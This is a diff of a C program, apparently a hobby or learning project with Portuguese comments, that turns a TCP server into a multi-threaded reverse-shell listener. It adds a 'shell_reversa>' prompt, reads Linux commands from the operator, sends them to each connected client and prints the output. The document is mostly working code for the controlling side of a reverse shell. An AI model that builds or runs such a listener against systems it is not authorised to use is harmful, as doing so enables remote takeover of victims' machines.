@@ -3,7 +3,6 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
-#include <asm-generic/socket.h>
 #include <pthread.h>
 #include <string.h>
 
@@ -11,24 +10,33 @@
 
 void *handle_client(void *arg) {
     int client_socket = *(int *)arg;
-    char buffer[1024] = {0};
-    char msg[1024];
-    char *argv[3];;
+    free(arg);
+    char buffer[1024];
+    int read_size;
+
+    printf("Cliente conectado com sucesso!\n");
+    printf("Digite comandos do Linux (ex: ls, pwd, whoami):\n\n");
 
     while(1){
+        printf("shell_reversa> ");
+        char msg[1024];
         fgets(msg, sizeof(msg), stdin);
         if(strcmp(msg, "exit\n") == 0){
-            printf("Exiting...\n");
+            printf("Cabosse o que era dosse...\n");
             break;
         }
         write(client_socket, msg, strlen(msg));
-        read(client_socket, buffer, sizeof(buffer));
-        printf("Received: %s\n", buffer);
-    }
-    
-    
+        memset(buffer, 0, sizeof(buffer));
+        read_size = read(client_socket, buffer, sizeof(buffer) - 1);
+        
+        if(read_size <= 0){
+            printf("\nConexao perdida com o cliente.\n");
+            break;
+        }
+        printf("%s", buffer);
 
-    
+    }
+
     close(client_socket);
     return NULL;
 }
@@ -38,7 +46,6 @@ int main() {
     struct sockaddr_in address;
     int opt = 1;
     int addrlen = sizeof(address);
-    char buffer[1024] = {0};
 
     
     if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
@@ -47,7 +54,7 @@ int main() {
     }
 
     
-    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
+    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
         perror("setsockopt");
         exit(EXIT_FAILURE);
     }
@@ -68,22 +75,23 @@ int main() {
     }
 
     
-    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
-        perror("accept");
-        exit(EXIT_FAILURE);
-    } else {
-        // TO-DO: CRIAR NOVA THREAD PARA CADA NOVA CONEXAO, PARA QUE O SERVIDOR NAO FIQUE BLOQUEADO
-        pthread_t thread_id;
+    while (1) {
+        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
+            perror("accept");
+            continue;
+        }
 
+        int *client_sock = malloc(sizeof(int));
+        *client_sock = new_socket;
+
+        pthread_t thread_id;
+        if (pthread_create(&thread_id, NULL, handle_client, client_sock) < 0) {
+            perror("Não foi possível criar a thread");
+            free(client_sock);
+        }
+        pthread_detach(thread_id); // Deixa a thread rodar solta
     }
 
-    
-    read(new_socket, buffer, sizeof(buffer));
-    printf("Received: %s\n", buffer);
-
-    
-    close(new_socket);
     close(server_fd);
-
     return 0;
 }
